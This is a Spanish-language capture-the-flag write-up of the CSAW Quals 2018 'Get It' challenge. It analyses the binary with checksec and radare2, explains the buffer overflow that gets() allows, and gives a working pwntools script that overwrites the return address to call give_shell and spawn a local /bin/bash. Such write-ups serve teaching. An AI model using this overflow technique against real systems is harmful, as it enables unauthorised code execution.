---
layout: post
title: Get It - Nightmare
tags: [ctf, rev, nightmare]
---

**Get It** \\
Csaw Quals 2018 Get It

## Intro

Este desafío es prácticamente igual que el anterior ([Warmup](../nightmare-warmup)), solo que en este caso obtendremos una shell. Recomiendo leer ese writeup primero ya que en este me saltaré los pasos similares.

## Analisis

### Checksec

**pwn checksec**:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

El binario es para arquitectura amd64 (64 bits). Tiene seguridad parcial (RELRO parcial) y carece de protección de "canary" en la pila, lo que puede dejarlo vulnerable a ataques de desbordamiento de búfer. Se ha habilitado la prevención de ejecución de código en el stack (NX). No se utiliza la ejecución aleatoria (No PIE), lo que podría hacerlo más susceptible a exploits.


### Radare2

Después de ejecutar checksec, abro el binario con **radare2** y listo las funciones junto con sus direcciones.

```
[0x7f290a22a360]> afl
0x004004c0    1 42           entry0
0x00400490    1 6            sym.imp.__libc_start_main
0x004004f0    4 50   -> 41   sym.deregister_tm_clones
0x00400530    4 58   -> 55   sym.register_tm_clones
0x00400570    3 28           sym.__do_global_dtors_aux
0x00400590    4 38   -> 35   entry.init0
0x00400670    1 2            sym.__libc_csu_fini
0x00400674    1 9            sym._fini
0x004005b6    1 17           sym.give_shell
0x00400480    1 6            sym.imp.system
0x00400600    4 101          sym.__libc_csu_init
0x004005c7    1 49           main
0x00400470    1 6            sym.imp.puts
0x004004a0    1 6            sym.imp.gets
0x00400438    3 26           sym._init
0x004004b0    1 6            sym..plt.got
[...]
```

Entre estas hay que destacar dos:
- main
- sym.give_shell

#### Main

```
[0x004005c7]> pdf
            ; DATA XREF from entry0 @ 0x4004dd
┌ 49: int main (int argc, char **argv);
│           ; var int64_t var_30h @ rbp-0x30
│           ; var int64_t var_24h @ rbp-0x24
│           ; var int64_t var_20h @ rbp-0x20
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x004005c7      55             push rbp
│           0x004005c8      4889e5         mov rbp, rsp
│           0x004005cb      4883ec30       sub rsp, 0x30
│           0x004005cf      897ddc         mov dword [var_24h], edi    ; argc
│           0x004005d2      488975d0       mov qword [var_30h], rsi    ; argv
│           0x004005d6      bf8e064000     mov edi, str.Do_you_gets_it__ ; 0x40068e ; "Do you gets it??"
│           0x004005db      e890feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004005e0      488d45e0       lea rax, [var_20h]
│           0x004005e4      4889c7         mov rdi, rax
│           0x004005e7      b800000000     mov eax, 0
│           0x004005ec      e8affeffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004005f1      b800000000     mov eax, 0
│           0x004005f6      c9             leave
└           0x004005f7      c3             ret
```

Lo interesante de esta función es que emplea la función **sym.imp.gets** para obtener la entrada del usuario. La cual es insegura porque no verifica los límites de un búfer al leer una cadena, lo que puede llevar a desbordamientos de búfer.

Esta vulnerabilidad nos permitirá sobreescribir la dirección de retorno de la función **main**.

#### Give_shell

```
[0x004005b6]> pdf
┌ 17: sym.give_shell ();
│           0x004005b6      55             push rbp
│           0x004005b7      4889e5         mov rbp, rsp
│           0x004005ba      bf84064000     mov edi, str._bin_bash      ; 0x400684 ; "/bin/bash"
│           0x004005bf      e8bcfeffff     call sym.imp.system         ; int system(const char *string)
│           0x004005c4      90             nop
│           0x004005c5      5d             pop rbp
└           0x004005c6      c3             ret
```

Esta función no tiene mucha complejidad. Al llamarla se ejecutará el comando "/bin/bash" mediante la función **sym.imp.system** obteniendo así una shell por lo que esta función será el objetivo.


## Exploit

Lo primero que necesito conocer es la distancia entre la entrada del usuario y la dirección de retorno que necesito sobreescribir. Para ello sigo los siguientes pasos:

1. Situo un breakpoint al final de la función **main**, justo antes de ejecutarse la instrucción "ret".
2. Busco en el stack la dirección de la entrada.
3. Debido a que me encuentro al final del **main**, el registro **rsp** apunta a la dirección que necesito sobreescribir por lo que solo debo restar las direcciones.

```
[0x7fcaebef1360]> dc
Do you gets it??
0xH3rshel
hit breakpoint at: 0x4005f7
[0x004005f7]> e search.in=dbg.stack
[0x004005f7]> / 0xH3rshel
Searching 9 bytes in [0x7fff4b1a4000-0x7fff4b1c5000]
hits: 1
0x7fff4b1c36b0 hit3_0 .7K0xH3rshel.
[0x004005f7]> ? rsp - 0x7fff4b1c36b0
int32   40
uint32  40
hex     0x28
octal   050
[...]
```

La distancia es de 0x28 (40) bytes.

Ahora solo tengo que hacer un script que envíe 0x28 bytes de padding y la dirección de **give_shell**.

```py
from pwn import *

target = process("./get_it")

payload = b"0"*0x28 # Padding, 40 = 0x28
payload += p64(0x004005ba) # Dirección dentro de give_shell

# Enviar payload
target.sendline(payload)

# Obtener shell
target.interactive()
```

Ejecuto el script y obtengo shell.

```
h3rshel@kali:~/Desktop/reversing$ python3 exploit.py
[+] Starting local process './get_it': pid 71431
[*] Switching to interactive mode
Do you gets it??
$ whoami
h3rshel
$
```

Página original: **[Nightmare](https://guyinatuxedo.github.io/)**.

